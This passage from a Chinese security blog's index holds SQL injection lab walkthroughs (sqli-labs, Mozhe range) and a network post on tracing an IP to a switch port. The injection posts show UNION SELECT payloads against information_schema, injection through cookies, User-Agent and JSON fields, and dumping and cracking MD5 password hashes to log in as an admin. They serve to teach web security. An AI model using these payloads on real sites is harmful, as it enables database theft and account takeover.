得到结果为123456，说明当网页同时存在GET与POST两种提交方式时 GET的请求方式是要优先与POST的，优先使用GET进行传参 所以当我们进行注入测试时，需要注意请求方法是GET还是POST，有时候页面往往没有什么显示结果 那就有可能是使用POST的请求方式来提交数据的，这时候就可以利用软件或者插件来代替手工注入 REQUEST 此时将网页请求方式改为request，测试结果 结果发现当请求方式为request时无论时GET还是POST都可以接收到请求 靶场演示POST数据提交注入测试第十一关 在输入框中输入用户名admin，密码admin 发现输入的数据回显到了页面上，说明我们输入的数据被进行了一个提交 此时我们用Burpsuite进行抓包，来看看网页使用什么方式将数据提交上去的 发现提交方式为POST，这种方式无法通过url来注入，既然通过POST来提交数据 那我们就可以通过修改POST的值来进行注入 由于网页接收了username和password的数据，所以两个地方都可以注入，通过观察源码 发现是用单引号进行闭合的，我们闭合后进行注入尝试获取列数 发现结果不是3，那么只能是2了 修改后再次发送 此时页面成功回显出1和2，注入成功 COOKIE数据提交注入测试第二十关 页面输入数据进行提交，查看结果 可以看得出这个页面提取了COOKIE信息，COOKEI我的理解是验证用户登录的一个凭据 登录时，会在本地缓存里留下COOKIE，包括一些账户密码信息，下次登录时就无需再次输入 此时抓个包看一下 发现网页通过GET的请求方式获取到了COOKIE信息，此时提交的是COOKIE里的数据 所以我们可以通过修改提交的COOKIE来进行注入 通过观察源码得知使用单引号闭合，我们闭合后进行注入尝试 结果成功回显，需要注意的是，有时候用–+进行注释不一定有用，可以换成#再试试 HTTP头部参数数据注入测试十八关 发现接收的是浏览器的User Agent，我们同样可以在UA处进行注入，由于步骤一样，就不多演示了 参数JSON数据注入测试JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析，在网页中抓包经常能抓到一些JSON格式的数据包 类似这样的JSON格式的数据包，说明网页对这个JSON数据进行了一个接收，我们搭建一个环境测试一下 网页接收的JSON格式是这样的：json={“username”:”admin”}，源码中使用单引号闭合 那我们提交的数据也得按照JSON的格式来，先单引号闭合，再猜测列数，最后联合查询，成功注入 参考博客：https://www.cnblogs.com/shley/p/14737017.html","categories":[{"name":"-web渗透","slug":"web渗透","permalink":"https://jxblogs.com/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"https://jxblogs.com/tags/web%E6%B8%97%E9%80%8F/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://jxblogs.com/tags/SQL%E6%B3%A8%E5%85%A5/"}],"author":"Xxu"},{"title":"SQL漏洞-基础注入测试","slug":"SQL漏洞-基础注入测试","date":"2021-11-25T04:23:46.000Z","updated":"2021-11-26T04:40:29.259Z","comments":true,"path":"posts/e8474e34.html","link":"","permalink":"https://jxblogs.com/posts/e8474e34.html","excerpt":"","text":"SQL漏洞-基础注入测试 sql注入漏洞的危害：拖库 数据库结构(以MySQL数据库为例)数据库A 表名 列名 数据 数据库B 表名 列名 数据 如何判断注入点 且 and 或 or 非 not 异或 xor 真且真 = 真 真且假 = 假 真或假 = 真 ​ 此时可以观察网页url，例如/?id=1或者/?s=这样带有提交信息的地方就很有可能存在注入点，通过修改提交的信息来进行sql注入测试 ​ 例如：url最后为/?id = 1 此时在后面添加and测试 ​ and 1=1 页面正常&nbsp;and 1=2 页面错误 ==表示可能存在注入点== ​ and 1=2 ==表示页面404或页面不影响,可能后台有检测，没有sql漏洞== 常规注入方式1.猜解列名数量&nbsp;&nbsp;&nbsp;&nbsp;在id=1 后面加上order by 3 如果页面正常，表示当前数据库表的列名数量为&gt;=3，如果页面错误，表示列名数量&lt;3，此时再改为order by 2，如果页面正常显示，就代表列名数量为2，就是当前表只有两列 2.进行联合查询联合查询的意思就是在搜索当前表的信息之后，再增加一行联合查询的信息 表达式：union select 例如sql语句为：select * from users，返回结果： id user password 1 xiaoming 123 2 zhangsan abc 此时进行联合查询：select * from users union select 1,2,3，结果为： id user password 1 xiaoming 123 2 zhangsan abc 1 2 3 此时就可以将1，2，3替换为我们想要的数据，在页面回显出来 例如可以替换成： user()：用户名 version()：mysql版本 database()：数据库名 @@datadir：数据库路径 @@plugin_dir：插件位置 load_file：文件路径 @@basedir MYSQL：安装路径 current_user()：当前用户 system_user()：系统用户 @@version_compile_os：操作系统版本 ==注意：联合查询的数量必须和列名数量一致，不然会回显不出来== 必懂知识点 1、mysql5.0版本以上，会自带一个数据库information_schema，里面存着所有数据名，所有表名，所有列名，这时候就可以利用这个特性，去查找相对应数据库下的表名和列名数据，其中高版本包括5.0以上，低版本5.0以下 2、数据库符号”.”，表示下一级，如 CMS.user表示CMS数据库下的user表，但是如果数据库名称带有.例如数据库名称为74cmsv3.4那么再用一个.user就失效了，因为只会解析前面那个. 3、各种语句 information_schema.tables：表示记录所有数据库的所有表名的表 information_schema.columns：表示记录所有数据库的所有列名的表 table_name：表名 column_name：列名 table_schema：数据库名 注释符号：–+ , # 限制查询的结果：LIMIT语句进行控制，Limit 0,1表示 0开始显示1条数据，可以修改起始位置0改变输出结果，例如对a的查询结果为a={1,2,3,4}，进行limit限制Limit 0,1，意思是从第0个数据开始，返回1个数据，结果为a={1},Limit 1,2返回的结果就是a={2,3} 如果在数据库中select * from users union select 1,2,3 加上Limit 0,1就代表从0行起，显示1行信息 id user password 1 xiaoming 123 案例实验环境：墨者靶场 分析：此时url没发现注入点，我们进入公告页面尝试找到更多信息 发现数据提交处，尝试1=2看看页面是否正常 页面回显错误，很有可能存在注入点，第一步，猜测列名，输入order by 5，查看结果 页面显示空白，说明列数小于5，接着尝试order by 4 此时页面显示正常，说明列名数量为4 那么进行第二步联合查询，在id=1 后加上 and 1=2，1是真，1=2是假，真且假为假，此时再进行联合查询union select 1,2,3,4那么前面假的数据就不会回显而是回显后面联合查询到的数据 此时发现其中的2，3成功被回显到了页面上，那么我们就可以通过修改2，3来回显出我们想要的数据 首先获取版本信息，发现数据库版本在5.0以上可以使用内置库information_schema 那么就可以通过information_schema来获取数据库名称，将2替换为database()，成功回显出数据库名称为： mozhe_Discuz_StormGroup 接下来需要知道的是当前表的表名 information_schema.tables：表示记录所有数据库的所有表名的表 其中有一列为table_name：表名，我们此时就是要获取table_name,表达式为： union select 1,table_name,3,4 from information_schema.tables 但是这样代表查询的是所有数据库的表名，所以我们还需要指定当前的数据库table_schema，此时表达式为： union select 1,table_name,3,4 from information_schema.tables where table_schema=\"mozhe_Discuz_StormGroup\" 获取到当前表名为：StormGroup_member，不过大多数数据库不仅仅只有一个表，想要回显所有的表名，我们还有一条语句叫group_concat可以把所有表的信息拼接在一块 group_concat(str1,str2,…)：连接一个组的所有字符串，并以逗号分割每一条数据，显示数据 此时发现有这么两个表：StormGroup_member,notice，这个notice应该就是刚刚的公告了，所以这个表就忽略，我们就看StormGroup_member 知道了数据库名，表名，接下来就是获取列名了 将table_name改为column_name，将记录所有表名的表information_schema.tables改为所有记录列名的表information_schema.columns 此时获取到列名有：id,name,password,status,id,title,content,time 此时可以看到关键字眼name，password，我们将这两列数据回显出来，此时表达式为： union select 1,name,password,4 from StormGroup_member 成功获取到 name：mozhe password：356f589a7df439f6f744ff19bb8092c0 这个password与md5加密方式很像，将其进行MD5解密得到 密码为：dsan13 返回页面尝试登录 结果显示用户被禁用，说明得用别的用户名和密码，我们用limit 1,1来回显出表中的第二行信息，获取到第二个账户 用户名：mozhe 密码：4297c0549e4db41f6e3d29f1c7793e2c 解密后：269118 此时我们再次用密码登录系统：成功进入系统后台，获取到key为：mozhef6578b1bf1f43a1c6951fd2068f","categories":[{"name":"-web渗透","slug":"web渗透","permalink":"https://jxblogs.com/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"https://jxblogs.com/tags/web%E6%B8%97%E9%80%8F/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://jxblogs.com/tags/SQL%E6%B3%A8%E5%85%A5/"}],"author":"Xxu"},{"title":"根据IP查找对应交换机端口(IP地址溯源)","slug":"根据IP查找对应交换机端口(IP地址溯源)","date":"2021-11-11T02:06:40.000Z","updated":"2021-11-12T03:17:34.221Z","comments":true,"path":"posts/651def0f.html","link":"","permalink":"https://jxblogs.com/posts/651def0f.html","excerpt":"","text":"项目现场中需要修改某个IP终端连接的VLAN时，不知道连接的是哪台交换机哪个端口，所以需要常常需要对IP地址进行端口溯源 例如：需要查看IP：29.206.33.211所在交换机端口 1、登录核心交换机，查看ARP表JDS-HX-S8610E#show arp | in 29.206.33.211 Internet 29.206.33.211 4 0002.0000.be2f arpa VLAN 206 2、复制对应的mac地址，并查看mac地址表JDS-HX-S8610E#show mac add 0002.0000.be2f Vlan MAC Address Type Interface ---------- -------------------- -------- ------------------- 206 0002.0000.be2f DYNAMIC AggregatePort 9 发现此时be2f连接的口是Port9，此时在核心交换机的show run中找到port-group 9所在的接口 3、用邻居表找到对应端口所连接的交换机JDS-HX-S8610E#show lldp nei Capability codes: (R) Router, (B) Bridge, (T) Telephone, (C) DOCSIS Cable Device (W) WLAN Access Point, (P) Repeater, (S) Station, (O) Other System Name Local Intf Port ID Capability Aging-time ErDaoMenLou-2F-S2952-01 Gi1/1/1 Gi0/51 B, R 1minutes 37seconds YiHaoJieDuSuShe-1F-HJ-S5750 Gi1/1/2 Gi1/0/12 B, R 1minutes 33seconds XiYiLou-4F-S2928-01 Gi1/1/4 Gi0/28 B, R 1minutes 44seconds HuoFang-1F-S2928-01 Gi1/1/5 Gi0/27 B, R 1minutes 58seconds BanGongLou-1F-S2928-01 Gi1/1/6 Gi0/27 B, R 1minutes 44seconds BanGongLou-2F-S2952-01 Gi1/1/7 Gi0/52 B, R 1minutes 51seconds BanGongLou-3F-S2952-01 Gi1/1/8 Gi0/51 B, R 1minutes 52seconds BanGongLou-4F-S2952-01 Gi1/1/9 Gi0/52 B, R 1minutes 59seconds BanGongLou-5F-S2928-01 Gi1/1/10 Gi0/28 B, R 1minutes 41seconds BanGongLou-6F-S2928-01 Gi1/1/11 Gi0/27 B, R 1minutes 31seconds ZongHeLou-2F-S2952-03 Gi1/1/12 Gi0/51 B, R 1minutes 50seconds YiDaoMenLou-1F-S2928-01 Gi1/1/13 Gi0/28 B, R 1minutes 36seconds XinLiZhiLiaoLou-2F-S2952-01 Gi1/1/14 Gi0/51 B, R 1minutes 39seconds 发现Gi1/1/7所连接的交换机是BanGongLou-2F-S2952-01，它的IP地址是29.144.33.13 4、telnet进去，再次show mac addJDS-HX-S8610E#telnet 29.144.33.13 Trying 29.144.33.13, 23... User Access Verification Password:*********** BanGongLou-2F-S2952-01&gt;en Password:*********** BanGongLou-2F-S2952-01#show mac add 0002.0000.be2f Vlan MAC Address Type Interface Time ---------- -------------------- -------- ------------------------------ -------------------- 206 0002.0000.be2f DYNAMIC AggregatePort 2 2020-2-14 15:34:28 发现此时be2f连接的口是Port2，并不是具体的接口，所以还需要继续往下找，此时在该交换机show run中找到port-group 2所在的接口 5、重复以上步骤BanGongLou-2F-S2952-01#show lldp nei Capability codes: (R) Router, (B) Bridge, (T) Telephone, (C) DOCSIS Cable Device (W) WLAN Access Point, (P) Repeater, (S) Station, (O) Other System Name Local Intf Port ID Capability Aging-time Unknown Gi0/3 8c16.4549.cc05 57minutes 59seconds Unknown Gi0/3 b025.aa27.c0ea 58minutes 16seconds Unknown Gi0/3 144f.d7c8.2917 45minutes 57seconds BanGongLou-2F-S2952-03 Gi0/47 Gi0/45 B, R 1minutes 49seconds BanGongLou-2F-S2952-03 Gi0/48 Gi0/46 B, R 1minutes 49seconds JDS-HX-S8610E Gi0/51 Gi2/1/7 B, R 1minutes 49seconds JDS-HX-S8610E Gi0/52 Gi1/1/7 B, R 1minutes 42seconds telnet进入BanGongLou-2F-S2952-03 BanGongLou-2F-S2952-03#show mac add 0002.0000.be2f Vlan MAC Address Type Interface Time ---------- -------------------- -------- ------------------------------ -------------------- 206 0002.0000.be2f DYNAMIC AggregatePort 5 2021-8-30 15:15:27 BanGongLou-2F-S2952-03#show lldp nei Capability codes: (R) Router, (B) Bridge, (T) Telephone, (C) DOCSIS Cable Device (W) WLAN Access Point, (P) Repeater, (S) Station, (O) Other System Name Local Intf Port ID Capability Aging-time ZhiHuiZhongXin Gi0/27 Gi0/23 B, R 1minutes 44seconds ZhiHuiZhongXin Gi0/28 Gi0/24 B, R 1minutes 45seconds Unknown Gi0/36 00d8.61e8.a421 49minutes 45seconds Unknown Gi0/39 00d8.61ea.8417 55minutes 31seconds BanGongLou-2F-S2952-01 Gi0/45 Gi0/47 B, R 1minutes 37seconds BanGongLou-2F-S2952-01 Gi0/46 Gi0/48 B, R 1minutes 37seconds BanGongLou-2F-S2952-02 Gi0/47 Gi0/47 B, R 1minutes 47seconds BanGongLou-2F-S2952-02 Gi0/48 Gi0/48 B, R 1minutes 47seconds Total entries displayed: 8 BanGongLou-2F-S2952-03# BanGongLou-2F-S2952-03#telnet 29.144.33.16 Trying 29.144.33.16, 23... User Access Verification Password:*********** ZhiHuiZhongXin&gt;en Password:*********** ZhiHuiZhongXin#show mac add 0002.0000.be2f Vlan MAC Address Type Interface Time ---------- -------------------- -------- ------------------------------ -------------------- 206 0002.0000.be2f DYNAMIC GigabitEthernet 0/5 2021-11-10 0:05:45 最后追溯至ZhiHuiZhongXin交换机上，在这台交换机上show macadd找到了确定的接口，说明就是这个口了，最后所得信息如下： IP：29.206.33.211 对端交换机：ZhiHuiZhongXin 交换机IP： 29.144.33.16 对端端口： GigabitEthernet 0/5 当需要修改vlan时，直接telnet进入交换机对应端口修改即可","categories":[{"name":"网络","slug":"网络","permalink":"https://jxblogs.com/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"IP","slug":"IP","permalink":"https://jxblogs.com/tags/IP/"},{"name":"交换机","slug":"交换机","permalink":"https://jxblogs.com/tags/%E4%BA%A4%E6%8D%A2%E6%9C%BA/"}],"author":"Xxu"},{"title":"python常用模块熟悉","slug":"python常用模块熟悉","date":"2021-11-06T15:55:55.000Z","updated":"2021-11-12T03:17:34.237Z","comments":true,"path":"posts/54bcc1f6.html","link":"","permalink":"https://jxblogs.com/posts/54bcc1f6.html","excerpt":"","text":"PY常用模块OS: sys： Crypto： BASE64: String： Platform： Time： Random： Paramiko：Kali： 连接不上，打开kali查看22端口是否开放： 发现果然没有开，先关闭kali防火墙 再安装openssh 再次查看，发现22端口已经开启： 再次尝试连接：成功连接 SSH批量爆破： []","categories":[{"name":"-python","slug":"python","permalink":"https://jxblogs.com/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://jxblogs.com/tags/python/"},{"name":"SSH批量爆破","slug":"SSH批量爆破","permalink":"https://jxblogs.com/tags/SSH%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4/"}],"author":"Xxu"}],"categories":[{"name":"-web渗透","slug":"web渗透","permalink":"https://jxblogs.com/categories/web%E6%B8%97%E9%80%8F/"},{"name":"网络","slug":"网络","permalink":"https://jxblogs.com/categories/%E7%BD%91%E7%BB%9C/"},{"name":"-python","slug":"python","permalink":"https://jxblogs.com/categories/python/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"https://jxblogs.com/tags/web%E6%B8%97%E9%80%8F/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://jxblogs.com/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"IP","slug":"IP","permalink":"https://jxblogs.com/tags/IP/"},{"name":"交换机","slug":"交换机","permalink":"https://jxblogs.com/tags/%E4%BA%A4%E6%8D%A2%E6%9C%BA/"},{"name":"python","slug":"python","permalink":"https://jxblogs.com/tags/python/"},{"name":"SSH批量爆破","slug":"SSH批量爆破","permalink":"https://jxblogs.com/tags/SSH%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4/"}]}